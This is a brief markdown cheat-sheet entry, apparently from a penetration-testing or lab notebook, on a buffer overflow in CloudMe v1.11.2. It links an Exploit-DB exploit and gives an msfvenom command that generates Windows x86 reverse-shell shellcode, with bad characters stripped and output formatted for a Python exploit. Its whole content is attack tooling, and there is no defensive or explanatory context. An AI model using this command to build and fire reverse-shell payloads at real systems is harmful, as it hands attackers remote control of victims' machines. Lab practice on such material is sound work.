# cloudMe

### BOF v1.11.2 <a href="bof-v1112" id="bof-v1112"></a>

```
https://www.exploit-db.com/exploits/48389
msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT-b '\x00\x0A\x0D' -f python -v payload
```
